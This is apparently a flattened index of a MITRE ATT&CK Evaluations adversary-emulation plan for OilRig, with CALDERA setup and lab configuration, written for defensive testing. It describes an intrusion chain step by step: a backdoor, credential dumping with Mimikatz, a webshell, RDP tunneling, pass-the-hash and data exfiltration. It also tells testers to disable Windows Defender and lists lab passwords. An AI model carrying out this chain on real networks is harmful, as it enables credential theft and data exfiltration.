https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/"]},{"i":"step-11---cleanup","l":"Step 11 - Cleanup"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 11 emulates OilRig's cleanup and egress from the target network."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["From within your PsExec session from WATERFALLS to ENDOFROAD:","Delete RDAT:","Delete the parent directory:","Terminate the PsExec session to ENDOFROAD:","Terminate the command prompt spawned by Mimikatz running as Tous","From your elevated command prompt on WATERFALLS(via RDP):","Delete Mimikatz, RDAT, and PsExec from disk.","From Kali:","Find the PID of the SSH tunnel and terminate it.","From your C2 callback into THEBLOCK:","Instruct the SideTwist agent to delete VALUEVAULT, the VALUEVAULT output, plink.exe, and the SideTwist killswitch file.","\uD83D\uDD34 End of Scenario. Note: SideTwist will continue to execute but will not beacon without the update.xml file"]}],[{"l":"DEPENDENCIES"},{"l":"CALDERA C2 Server","p":["Linux/Mac OS, 64-bit","git commandline installed","python3.7+ with pip3","python3.9+ recommended","golang 1.17+","required for dynamic agent compilation"]},{"l":"Attacker Machine Dependencies","p":["Linux OS, 64-bit","Kali recommended","Can be the same machine as the CALDERA C2 server if needed.","Command-line tools","xfreerdp","xdotools","curl"]},{"l":"SETUP"},{"l":"Download and Install CALDERA","p":["Run the following on a Linux/Mac machine of your choice. This machine will act as your C2 server, or the \"attacker\" host. For the purposes of this walkthrough, the C2 server will have an IP address of 192.168.0.4.","Add the emu plugin add emu to your conf/local.yml configuration file. Feel free to enable or disable other plugins by adding/removing them from the configuration file. You can also configure your user accounts and credentials if needed.","Download pip dependencies.","Download required payloads for emu plugin.","Run your C2 server from the caldera directory. This will unzip encrypted executables throughout the adversary-emulation-library and ingest its emulation plans.","Update payload name for mimikatz to m64.exe. Note: this may require a server restart for Caldera to pick up the new payload."]},{"l":"RUNNING THE OPERATION"},{"l":"Launch Agents","p":["Launch the first agent by running the following command on 10.1.0.5 (THEBLOCK) as the user gosta. The password for gosta is d0ntGoCH4ingW8trfalls. Note that you may need to replace gosta with the applicable username, if you are not using the gosta user. This agent is meant to replace SideTwist payload used in the original scenario.","RDP to 192.168.0.4, the Kali attacker host, as user saka with password ceKa#zUUc4^9yZ. You may need to modify the command so the server value matches your attacker host's IP address. Launch the second agent by running the following command. Note: keep this RDP open as this will be leveraged by xfreerdp in the executed Caldera operation.","Log into CALDERA's web GUI by accessing your C2 server address in a web browser (Chrome recommended), and using your credentials (default username is red, default password is admin).","Make sure you can see your agents after clicking the agents option on the menu on the left, under \"Campaigns\".","For best results, make sure you don't have other agents currently beaconing in."]},{"l":"Planner","p":["This port requires CALDERA to run each ability on a specific agent. For example, some abilities should run only on the gosta group of agents, while other abilities should run only on the kali group of agents. Therefore, this port uses a custom planner which specifies the agent group that should run each ability.","The commands to start agents will include a -group flag to specify the agent's group. This group will correspond to the group listed in the custom planner. If the groups that are specified in Launch Agents are edited, the group names in the planner will need to be updated correspondingly."]},{"l":"Fact Setup","p":["Before running the operation, you will need to make sure that the OilRig fact source is properly configured for your environment. While default fact values are provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under Configuration, select fact sources. Under the \"Select a source\" drop-down menu, select OilRig (Emu), which is the fact source for the OilRig adversary. From there, update the following facts as needed:","initial.target.user: The username of the initial target.","initial.target.password: The password of the initial target.","second.target.host: The hostname address of the second target.","second.target.ip: The IPv4 address of the Exchange server.","network.domain.name: The network domain name for initial target system","caldera.server.ip: The IPv4 address of the attacker system.","caldera.user.password: The password for the attacker system.","caldera.user.name: The username of the attacker system.","second.target.user: The username for the SQL server administrator.","second.target.ntlm: NTLM hash value for the user of the SQL server administrator.","third.target.ip: The IPv4 address of the SQL server.","exfil.target.email: The adversary-controlled email address used to exfiltrate data.","server.api.key: The API key for the CALDERA server."]},{"l":"Operation Setup","p":["Add in an appropriate name for your operation.","Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.","After adjusting the fact source as needed, select operations from the left menu, under \"Campaigns\".","For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.","For Autonomous, make sure \"Run Autonomously\" is selected.","For Group, make sure All Groups is selected.","For Run state, make sure \"Run immediately\" is selected.","For the adversary profile, select OilRig.","For the Fact Source, select OilRig (Emu).","For the Parser, select \"Do not use default parsers\".","For the Planner, select OilRig Planner.","Keep visibility at 51.","Make sure the plain-text obfuscator is selected.","Select \"+ Create Operation\" to the right of the drop-down menu.","Select Advanced to expand the Advanced configurations.","When ready, hit the Start button and wait for your operation to complete."]},{"l":"TERMINATING THE OPERATION","p":["Press the stop button in the operation GUI to finish the operation. Terminate the Kali agent from the GUI or RDP/SSH into the machine to stop the agent processes."]},{"l":"Cleanup","p":["The following commands should be run on 10.1.0.5 (THEBLOCK):"]},{"l":"Exfiltrated Files","p":["Throughout the operation, some files will be exfiltrated through a CALDERA agent back to the CALDERA server.","The directory on the CALDERA server machine that contains the uploaded files depends on the exfil_dir setting within the CALDERA configuration file (/tmp/caldera by default). Within this exfil directory, you'll find a subdirectory of the format hostname-agentidentifier, where hostname is the hostname where the agent was running, and the agent identifier is the unique identifier for the agent. The encrypted uploaded files will be in that subdirectory.","To decrypt the uploaded files, you can use the decryption utility provided in app/utility/file_decryptor.py within the CALDERA main directory. Run it and pass in the path to the CALDERA configuration file used (e.g. default.yml or local.yml) as well as the path to the input file and output file (change file paths in the example as needed)."]},{"i":"modificationsdeviations-from-the-original-emulation-plan","l":"MODIFICATIONS/DEVIATIONS FROM THE ORIGINAL EMULATION PLAN"},{"l":"Step 1","p":["Initial access will be performed by running a CALDERA agent executable named SystemFailureReporter.exe, rather than a malicious Word document with VBA macros. The agent will act as the remote access implant and is a compiled .exe written in Golang.","The SideTwist payload, update.xml, and b.doc will not be used","SystemFailureReporter.exe as used in evals will be replaced by the CALDERA agent named SystemFailureReporter.exe.","Following initial access, the agent will use two VBS scripts to collect the hostname and username environment variables, mimicking the macro used in evals.","The agent will not perform sandbox detection checks using Application.MouseAvailable.","The agent will not use GetUserName API, GetComputerName API, and GetDomainName API to find the current user, hostname, and domain respectively."]},{"l":"Step 2","p":["The CALDERA agent will run all of the commands in Step 2 via cmd.exe. However, the commands will be executed separately instead of being chained together. From a defender's viewpoint, the port's execution will appear as:","as opposed to the scenario's execution, which would have appeared as:"]},{"l":"Step 3","p":["b.exe will be downloaded to the workstation as a payload from the CALDERA server. In the port, b.exe will be automatically deleted when it stops running, as opposed the original scenario, where b.exe is deleted in Step 11.","fsociety.dat will be exfiltrated via the C2 channel to the CALDERA exfil directory, which is by default /tmp/caldera on the CALDERA server host. More information regarding exfiltrated files is available above."]},{"l":"Step 4","p":["Contact.aspx will be uploaded as a payload to the CALDERA server. It will be downloaded to THEBLOCK through the C2 channel, and will then be copied to the WATERFALLS Exchange Web Services directory. In the original scenario, contact.aspx is downloaded directly to the C:\\Users\\Public\\ directory on THEBLOCK. However, in the port, CALDERA will download contact.aspx to the agent's current directory, which will be C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\. Then, Step 4.A.1 will copy the file from C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\ to C:\\Users\\Public\\.","The ability labeled as Step 4.A.2 \"Server Software Component: Web Shell\" (T1505.003) includes Step 4.A.3, \"Hide Artifacts: Hidden Files & Directories\" (T1564.001).","Step 4.A.5, \"Indicator Removal on Host: File Deletion\" (T1070.004) will be included in the cleanup command for Step 4.A.1."]},{"l":"Step 5","p":["This step will be performed by the agent that was manually launched on the \"attacker\" system.","The -s flag was added to the curl commands to activate \"silent\" mode. This restricts the progress meter from displaying in order to allow CALDERA GUI to properly capture terminal output. The -s flag will also restrict error messages from appearing.","In this step and in all following steps, the password for gosta has been changed from d0ntGoCH4$ingW8trfalls to d0ntGoCH4ingW8trfalls."]},{"l":"Step 6","p":["The -s flag was added to the curl commands to activate \"silent\" mode. This restricts the progress meter from displaying in order to allow CALDERA GUI to properly capture terminal output. The -s flag will also restrict error messages from appearing."]},{"l":"Step 7","p":["plink.exe will be downloaded to the workstation as a payload from the CALDERA server. In the original scenario, plink.exe is initially downloaded to C:\\Users\\Public\\Downloads\\plink.exe. In the port, it will be downloaded through the C2 channel to the same folder as the agent on the THEBLOCK. Then, it will be copied to the Downloads folder.","The additional -no-antispoof flag was added to avoid the required interaction step.","Step 7.A.3, \"Valid Accounts: Domain Accounts\" (T1078.002) is included in Step 7.A.4.","Steps 7.A.2 and 7.A.4 are run using exec-background which runs a command as a background process. The /cert-ignore parameter is also added to Step 7.A.4.","The password for saka has been changed from $ceKa#zU$Uc4^9yZ to ceKa#zUUc4^9yZ."]},{"l":"Step 8","p":["xdotool is used to control the RDP session to 10.1.0.6. Because xdotool controls a remote system using pre-determined key presses, the sequence of key presses in Step 8 may need to be modified depending on your environment.","Step 8.A.9 includes Steps 8.A.5 through 8.A.8."]},{"l":"Step 9","p":["In continuation from Step 8, xdotool is used to control the RDP session."]},{"l":"Step 10","p":["In continuation from Step 8, xdotool is used to control the RDP session.","Step 10.A.6 includes Steps 10.A.1-10.A.6"]},{"l":"Step 11","p":["Because the gosta agent replaces SideTwist, the gosta agent will be killed instead of killing SideTwist. Additionally, update.xml was not used in the port so it does not need to be deleted in the cleanup stage.","The API key fact value may need to be updated to your server's API key in order to modify the gosta agent's watchdog value, which then kills the agent.","b.exe was saved to agent's location as a payload, was run from that location, and was automatically deleted when the command finished. Therefore, it will not be deleted in this step."]}],[{"l":"Scenario Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by OilRig.","The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating OilRig to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server."]},{"l":"Resources","p":["The Binaries.zip contains all executables in one zip file for easy download. The password is malware.","This scenario also utilizes Mimikatz, Plink and PsExec as payloads:","Mimikatz","Plink","PsExec.exe"]},{"l":"Emulation Team Infrastructure","p":["Linux Attack Platform: Kali Linux 2019.2","Mail and File Server: Kali Linux 2019.2"]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Linux Attack Platform","192.168.0.4","Mail and Apache Server","192.168.0.5"]},{"l":"A note about red team payloads","p":["This evaluation utilizes payloads that model malware previously used by OilRig.","These utilities include credential dumpers, implants, and file exfiltration.","The Binaries.zip contains all executables in one zip file for easy download. The password is malware.","Implants are configured to connect back to static IP address 192.168.0.4. Build instructions for each payload can be found with source code in their respective directories."]},{"i":"linux-attack-platform-setup--19216804","l":"Linux Attack Platform Setup \\ 192.168.0.4","p":["Download the OilRig ATTACK Evaluations Library to the /opt/ directory","Use the Linux commands below to populate the binaries in the expected directories for the scenario:","Download Mimikatz to the Resources/payloads/TwoFace/ directory. Rename Mimikatz executable as m64.exe.","Download Plink to the Resources/payloads/SideTwist/ directory","Download PsExec.exe to the Resources/payloads/TwoFace/ directory","Install FreeRDP"]},{"i":"mail-and-file-server-setup--19216805","l":"Mail and File Server Setup \\ 192.168.0.5","p":["Install Apache","Install Postfix","Stage the SideTwist dropper Marketing_Materials.zip to /var/www/html","Run the install-configure-postfix.sh bash script as sudo","Run the setup-apache-fileserver.sh bash script as sudo","Note: You may need to chmod the scripts to allow them to run."]},{"l":"Target Infrastructure","p":["4 targets, all domain joined to the boombox domain:","SQL Server: tested and executed on CentOS 7.9","Domain Controller: tested and executed on Windows Server 2k19 - Build 17763","Exchange Server: tested and executed on Windows Server 2k19 - Build 17763","Exchange Admin Workstation: tested and executed on Windows 10 - Build 17763"]},{"l":"Target Infrastructure Configuration","p":["Target System","Hostname","IP Address","SQL Server","endofroad","10.1.0.7","Domain Controller","diskjockey","10.1.0.4","Exchange Server","waterfalls","10.1.0.6","Exchange Admin Workstation","theblock","10.1.0.5"]},{"i":"configure-domain-controller-diskjockey-10104","l":"Configure Domain Controller diskjockey\\ 10.1.0.4","p":["Create the user accounts as used in the scenario:","Domain Admins","Domain Users","EWS Admins, Domain Users","EWS Admins, SQL Admins, Domain Users","gosta","groups","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:","mariam","Note: in the scenario, DNS records were manually created to emulate network activity from suspect domains","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","Open Windows Defender, toggle all nobs to the off position.","shiroyeh","shiroyeh_admin","tous","username"]},{"i":"configure-workstation-theblock-10105","l":"Configure Workstation theblock\\ 10.1.0.5","p":["Ensure Microsoft Office is installed and that you're able to edit a document. This will ensure the macros run correctly against the host.","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:"]},{"i":"configure-ews-server-waterfalls-10106","l":"Configure EWS Server waterfalls\\ 10.1.0.6","p":["Setup Exchange Server to host OWA and EAC.","Create the \"EWS Admins\" group, adding tous, gosta","Install MSSQL","Create a scheduled task to run the sql_connection.bat upon system startup:","Reboot the machine and verify connection in PowerShell:","Open Windows Defender, toggle all nobs to the off position.","In the same PowerShell window, run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:"]},{"i":"configure-sql-server-endofroad-10107","l":"Configure SQL Server endofroad\\ 10.1.0.7","p":["Install MSSQL and configure data to be stored locally on the C: drive.","Create an \"SQL Admins\" domain group with tous as a member, additionally giving tous access permissions and ownership of the DB.","Sign in as tous and create a new database called sitedata.","Import the minfac.csv data file to populate the database.","Create a backup of the database to the drive for later exfiltration by the adversary Note: For the purpose of execution, this directory was C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\" and run the modify-defender.ps1 script:","In the Administrator Powershell Terminal run the disable-automatic-updates.ps1 script:","In the Administrator Powershell Terminal run the choco-install.ps1 script:","In the Administrator Powershell Terminal run the install-packages.ps1 script:","Open port 1433 in Windows Defender Firewall","Add the \"SQL Admins\" group to Local Administrators"]},{"l":"Network Diagram","p":["A network diagram is available that displays the domains and infrastructure that was used to support the setup and execution of the Emulation plan."]}],[{"i":"#","p":["Based on open-source intelligence, the ATT&CK Â® Evaluations team created the below scenario leveraging techniques seen from Oilrig in the wild. We have adapted the scenario based on tools and resources available at the time. Below is a diagram, scenario overview, step-by-step breakdown, and an infrastructure diagram."]},{"i":"emulation-scenario","l":"Emulation Scenario \uD83D\uDCD6","p":["This scenario follows OilRigâs multi-phase approach to exfiltrating sensitive data from a targeted server. OilRig leverages spearphishing to gain initial access onto an administratorâs workstation and deploys their SideTwist malware. Once persistence is established on the victim network, the attackers will escalate privileges and move laterally onto an EWS server. Further enumeration of the EWS server will lead to OilRigâs identification of a SQL server storing confidential critical infrastructure data. Characteristics of this campaign include: custom webshells, Windows and Microsoft 365 exploitation, and key attacker objective on obtaining control of the SQL server to steal victim files. Phase 1: This scenario begins with the legitimate user Gosta downloading and opening a malicious Word document sent via spearphishing. When the document is first opened, the enabled macros will stealthily install the SideTwist backdoor on Gostaâs Windows host machine. SideTwist connects to a C2 server using GET & POST requests, with responses hidden in the source code of an NotFlickr page. After performing initial enumeration on Gostaâs device, OilRig discovers that the user is a member of the administrator group on an Exchange Web Server (EWS). Phase 2: The SideTwist backdoor harvests credentials and collects Gosta's password using VALUEVAULT, a credential theft tool. Using Gostaâs stolen EWS credentials, the attackers establish a remote connection to EWS via RDP tunneling. Once connected to the EWS, OilRig deploys the TwoFace webshell on the server to gain access to additional resources on the network. The use of TwoFace to perform enumeration on the EWS will lead attackers to discover a SQL server. Phase 3: Next, OilRig will use the TwoFace webshell to download Mimikatz and dump the credentials of targeted administrators on the EWS. Using the stolen credentials of Tous, an SQL admin, the adversary will perform pass-the-hash to move laterally onto the targeted SQL server. This signals the start of the data exfiltration phase. The attackers will gain persistent access to the database through the custom RDAT backdoor, copy the database backup files and exfiltrate them via the EWS API to an attacker-controlled mailbox.","Operations Flow Diagram","Software Flow Diagram"]},{"i":"scenario-steps","l":"Scenario Steps\uD83D\uDC63","p":["As the user Tous, OilRig uses the command prompt created by the Mimikatz pass the hash to perform discovery of the database backup files on the SQL server. OilRig will collect and exfiltrate the backups of the database files via the EWS API. OilRig first creates a new directory in which to stage the collected data. The attackers will move RDAT to this new directory and rename it as VMware.exe. The newly named backdoor is used to read the data, split it into 20,000 byte chunks, and exfiltrate it via EWS API to an attacker-controlled email ( sistan@shirinfarhad.com). The stolen data is obfuscated within BMP images attached to the emails sent to the attackers.","cmd","cmd Mimikatz RDAT","Credential dumping https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/","Discovery https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/ RDAT/Exfiltration https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/ TwoFace https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/ C2 Communications https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","Finally, the adversary deletes all artifacts and files from the EWS and SQL server, terminates command prompts, ups and exits the target network.","https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/","In order to escalate privileges, OilRig will use SideTwist to download VALUEVAULT onto the Gostaâs device. VALUEVAULT will be used to conduct low privilege credential dumping and retrieve the plaintext password for Gosta. The attackers send this data back to the C2, obfuscating communications via HTTP POST requests.","Mimikatz TwoFace Webshell","Network Discovery https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/ TwoFace https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/","OilRig gains initial access from user Gosta ( THE BLOCK, 10.1.0.5) downloading and opening a Microsoft Word document received from a spearphishing email. Once Gosta enables the malicious macros embedded in the document, the SideTwist payload is stealthily dropped onto the system. The executable is initially named b.doc and will later be renamed to SystemFailureReporter.exe. OilRig then will use SideTwist to conduct initial discovery on the Windows host machine ( THE BLOCK) and connect to the C2 server over XOR encrypted protocol HTTP on port 443. The attackers C2 infrastructure consists of an HTTP server that hosts a dummy NotFlickr page. Commands with SideTwist are embedded between script tags on this webpage. Analyst Note: The document is pre-positioned in the environment. We do not emulate sending the document to target, as our focus is evaluating their product against post-initial-access TTPs.","OilRig moves laterally onto the EWS via remote port forward using the plink command line tool. The adversary conducts a remote port forward from Gostaâs workstation to the attacking machine to allow RDP access through port 3389 as user Gosta.","OilRig uses the TwoFace webshell to perform enumeration on the EWS to discover the SQL server ( ENDOFROAD, 10.1.0.7). OilRig first uses the webshell to perform some initial discovery by enumerating the current user, system network configuration and system network connections. At this point, the attackers identify an open connection to the SQL server via a port commonly associated with SQL. Analyst Note: TwoFace comprises 2 separate webshells - the first is deployed initially to save and load the second webshell, which is the one used to run commands on the compromised server. However, due to team constraints, we deployed a single webshell that can upload/download files and run commands.","OilRig uses the webshell to download Mimikatz to the EWS and uses elevated privileges to dump credentials. The dumped credentials, which include those for SQL server administrator Tous, are exfiltrated back to the C2 ( 192.168.0.4) via the webshell. After exfiltration is complete, OilRig deletes both Mimikatz and the dumped credentials from the directory on the EWS.","OilRig utilizes SideTwist to perform a string of initial enumeration commands via the command line. Specifically, the adversary enumerates the current user, system information and configuration, domain users, domain groups, domain accounts, local groups, network connections, running processes, running services, and a registry key value to check if RDP is enabled. At this point, OilRig has discovered the following: the current user Gosta is a member of the EWS Admins group, the presence of an EWS server ( WATERFALLS, 10.1.0.6) on the network which is a part of the Exchange Trusted Subsystem group, and the existence of several other administrator groups (including SQL Admins, of which user Tous is a member).","Plink/SSH commands https://www.opmd.fr/blog/dnspionage-focus-on-internal-actions/ EWS lateral movement https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/","PSExec https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/ Pass the Hash https://www.clearskysec.com/wp-content/uploads/2020/02/ClearSky-Fox-Kitten-Campaign-v1.pdf","PSExec TwoFace Webshell RDAT Mimikatz Cmd","Reporting","SideTwist","SideTwist https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ VALUEVAULT https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network Hard Pass http://web.archive.org/web/20190316025511/http://oxid.it/downloads/vaultdump.txt","SideTwist https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/ VBA coding/macros https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/ Enumeration https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/ EWS/Exchange Trusted Subsystem Discovery https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/","SideTwist VALUEVAULT Golang version of â Windows Vault Password Dumperâ Source code Binary","Software","Step 1 (Initial Compromise & Persistence) T1566.002 T1204.002 T1059.005 T1082 T1033 T1497.001 T1027 T1105 T1036 T1083 T1053.005 T1016 T1071.001 T1573.001","Step 10 (Clean-up & Egress) T1070.004","Step 2 (Workstation Discovery) T1059.003 T1033 T1082 T1016 T1087.002 T1069.002 T1201 T1087.001 T1069.001 T1049 T1057 T1007 T1012 T1018","Step 3 (Host Discovery & Credential Collection) T1105 T1555.004 T1041","Step 4 (Web Shell Installation) T1105 T1570 T1505.003 T1564.001 T1070.004","Step 5 (EWS Discovery) T1505.003 T1033 T1016 T1049","Step 6 (Credential Dumping) T1105 T1003.001 T1041 T1070.004","Step 7 (Lateral Movement to EWS) T1105 T1572 T1078.002 T1021.001","Step 8 (Lateral Movement to SQL Server) T1505.003 T1105 T1550.002 T1059.003 T1570 T1021.002 T1569.002","Step 9 (SQL Server Discovery, Collection & Exfiltration) T1083 T1074.001 T1036.006 T1005 T1030 T1048.003 T1027","Steps","TwoFace https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/ PSExec https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/","TwoFace Webshell","TwoFace webshell plink SideTwist","User Story","Using Gostaâs stolen EWS credentials, OilRig installs the TwoFace web shell for persistence on the EWS. This is accomplished by downloading TwoFace (named contact.aspx) via the SideTwist executable. The attackers will then copy the webshell from Gostaâs Windows workstation to the EWS, obfuscating the activity with attrib + h. OilRig covers their tracks by deleting TwoFace from Gostaâs user directory.","Using the credentials collected for the SQL administrator Tous, the attackers move laterally to the SQL server. First, the webshell is used to download PsExec, RDAT, and a newly named Mimikatz to disk. Through the tunneled RDP, OilRig will open an elevated command prompt and uses Tous' NTLM hash to execute a pass-the-hash to spawn a second shell on the EWS. As the user Tous, OilRig copies the RDAT backdoor to the SQL server and executes PsExec to get a shell on the targeted server.","VALUEVAULT TwoFace Webshell"]},{"l":"Infrastructure Diagram"}],[{"l":"OilRig Intelligence Summary"},{"i":"attck-group-id-g0049","l":"ATT&CK Group ID: G0049","p":["Objectives: OilRig is a cyber threat actor whose collection objectives align with the strategic interests of Iran. 1 2 The group is believed to have been operating since at least 2014 and is reportedly maintaining operational successes as of 2022. 3 OilRig's objectives have been focused on reconnaissance activity and exfiltration of information that could be used to inform strategic decision making. 4","Target Industries: OilRig operations have been directed against financial, government, energy, chemical, telecommunications, and other sectors. Geographically, OilRig has targeted the Middle East, East Africa, Europe and the United States. A leak of OilRigâs tools and victim data in 2019 5 revealed a more comprehensive list of targets, including Albania, Bahrain, Cambodia, China, Egypt, Israel, Jordan Kazakhstan, Kuwait, Lebanon, Macau, Mexico, Myanmar, Nigeria, Oman, Palestine, Qatar, Samoa, Saudi Arabia, South Korea, Taiwan Thailand, Tunisia, Turkey, UAE, and Zimbabwe. 1 6","Operations: OilRigâs tradecraft is notable for their commitment to stealth and persistence in the pursuit of their mission objective. OilRig has demonstrated adeptness in a broad range of attack vectors and a willingness to deviate from their existing arsenal to use novel techniques to accomplish their objectives. OilRig predominantly leverages social engineering as an initial attack vector but has also exploited patched vulnerabilities. Following the 2019 leak of OilRigâs tools and victim data, the group actively evolved their payload arsenal and retooling to avoid detection, creating multiple different malware variants with the same purpose as always: to gain an initial foothold on targeted devices. 7 8","OilRig is reported to have attained initial access via phishing ( T1566.001, T1566.002, T1566.003), and credential abuse ( T1078). 8 9 After achieving an initial foothold, OilRig actors are reported to use credential dumping tools, such as Mimikatz, to gather legitimate account credentials ( T1003.001) then move laterally to other systems on the network. OilRig is also known for installing webshells to transfer tools ( T1105) and maintain persistent access to the network. 10","Associated Groups: COBALT GYPSY, IRN2, APT34, Helix Kitten"]},{"l":"Technique Scope","p":["OilRig Technique Scope"]},{"l":"Group Overview Report References","p":["1","10","2","3","4","5","6","7","8","9","https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-group-loves-to-meow-middle-eastern-and-international-organizations-48ae","https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/","https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/","https://unit42.paloaltonetworks.com/threat-brief-iranian-linked-cyber-operations/","https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt","https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/","https://www.malwarebytes.com/blog/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor","https://www.mandiant.com/resources/blog/targeted-attack-in-middle-east-by-apt34","https://www.welivesecurity.com/wp-content/uploads/2022/02/eset_threat_report_t32021.pdf","https://www.zdnet.com/article/source-code-of-iranian-cyber-espionage-tools-leaked-on-telegram/","Report Links","Source ID"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]}]]